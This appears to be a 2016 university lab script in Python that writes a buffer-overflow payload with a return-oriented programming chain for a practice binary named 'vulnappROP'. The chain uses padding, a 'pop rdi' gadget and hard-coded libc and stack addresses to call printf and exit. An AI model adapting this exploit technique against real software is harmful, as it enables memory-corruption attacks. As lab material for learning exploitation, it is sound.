#!/usr/bin/env python
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016

from struct import *

lenfill = 72 # or some other value

# Gadget address: found by "ropsearch 'pop rdi' libc" in gdb.
addr_gadget = pack("<Q", 0x7ffff7ad4000)
# String address: found by searching the stack.
addr_string = pack("<Q", 0x7fffffffe32b)
# Printf address: found by "p printf".
addr_printf = pack("<Q", 0x7ffff7a69400)
# Exit address: found by "p exit"
addr_exit   = pack("<Q", 0x7ffff7a51290)

with open('payload','w') as f:
    f.write('A' * lenfill + addr_gadget + addr_string + addr_printf + addr_exit)

# Program runs well with the ENV provided:
# MY_TEXT='Hello, world!' ./vulnappROP < payload